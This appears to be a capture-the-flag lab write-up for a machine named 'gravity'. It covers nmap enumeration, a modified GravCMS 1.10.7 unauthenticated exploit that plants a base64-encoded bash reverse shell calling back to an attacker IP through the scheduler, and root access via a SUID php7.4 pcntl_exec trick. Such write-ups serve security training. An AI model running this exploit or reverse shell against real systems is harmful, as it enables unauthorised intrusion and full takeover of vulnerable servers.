## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.216.12
# HOSTNAME
gravity
# OPERATING SYSTEM
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41
```
# ENUMERATION
## PORT 80
```bash
# Nmap
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41
- Apache httpd 2.4.41
- 2021-03-17 17:46  grav-admin/

http://192.168.216.12/grav-admin/

- sudo curl -s $url/grav-admin/| grep -oP 'href="\K[^"]+' | less
- Links from source code http://192.168.216.12/grav-admin/
/grav-admin/user/themes/quark/images/favicon.png
http://192.168.216.12/grav-admin/
/grav-admin/user/plugins/markdown-notices/assets/notices.css
/grav-admin/user/plugins/form/assets/form-styles.css
/grav-admin/user/plugins/login/css/login.css
/grav-admin/user/themes/quark/css-compiled/spectre.min.css
/grav-admin/user/themes/quark/css-compiled/theme.min.css
/grav-admin/user/themes/quark/css/custom.css
/grav-admin/user/themes/quark/css/line-awesome.min.css
/grav-admin
/grav-admin/typography


- Checking for exploits for grav
searchsploit grav 
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)| php/webapps/49973.py
```
## PORT 22
```bash
# Nmap
22/tcp open ssh syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)| php/webapps/49973.py
- Changes made to the exploit code
-----------------------------------------------------------------------------------
#/usr/bin/python3
import requests
import sys
import re
import base64
target= "http://192.168.216.12"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.45.190/8888 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE5MC84ODg4IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/grav-admin/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/grav-admin/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/grav-admin/admin/config/scheduler",data=data,headers=headers)
---------------------------------------------------------------------------------------

sudo nc -nvlp 8888
python 49973.py

connect to [192.168.45.190] from (UNKNOWN) [192.168.216.12] 39176                        
bash: cannot set terminal process group (65247): Inappropriate ioctl for device
bash: no job control in this shell                                                            
www-data@gravity:~/html/grav-admin$ which python
which python                                                                                  
www-data@gravity:~/html/grav-admin$ which python3
which python3                                                                                 
/usr/bin/python3                                      
```
## PRIVILEGE ESCALATION
```bash
# SUID
www-data@gravity:~/html/grav-admin$ find / -perm -u=s -type f 2>/dev/null                     
/usr/bin/php7.4

# GTFOBINS
www-data@gravity:~/html/grav-admin$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Sat Nov 30 00:08:36 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.216.12
Nmap scan report for 192.168.216.12
Host is up, received echo-reply ttl 61 (0.039s latency).
Scanned at 2024-11-30 00:08:38 IST for 25s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmPOfERLKCxx+ufQz7eRTNuEEkJ+GX/hKPNPpCWlTiTgegmjYoXQ7MA5ibTRoJ6vxpPEggzNszJKbBrSVAbRuT2sBg4o7ywiGUy7vsDBpObMrBMsdKuue3gpkaNF8DL2pB3v/XAxtavq1Mh4vz4yj99cc2pX1GhSjpQTWlsK8Rl9DmBKp7t0XxEWwq3juQ9JiN5yAttMrbTDjwMNxcipsYv0pMudDBE6g4gQyiZGwuUfBn+HirxnfRr7KkxmBaEpZgukXSJ7fXYgpQVgNP2cvd2sy/PYe0kL7lOfYwG/DSLWV917RPIdsPPQYr+rqrBL7XQA2Qll30Ms9iAX1m9S6pT/vkaw6JQCgDwFSwPXrknf627jCS7vQ8mh8UL07nPO7Hkko3fnHIcxyJggi/BoAAi3GseOl7vCZl28+waWlNdbR8gaiZhDR1rLvimcm3pg3nv9m+0qfVRIs9fxq97cOEFeXhaGHXvQL6LYGK14ZG+jVXtPavID6txymiBOUsj8M=
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAweAzke7+zPt3Untb06RlI4MEp+vsEJICUG+0GgPMp+vxOdxEhcsVY0VGyuC+plTRlqNi0zNv1Y0Jj0BYRMSUw=
|   256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJP5z2Scxa02tfhI1SClflg5QtVdhMImHwY7GugVtfY
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 30 00:09:03 2024 -- 1 IP address (1 host up) scanned in 27.24 seconds

```

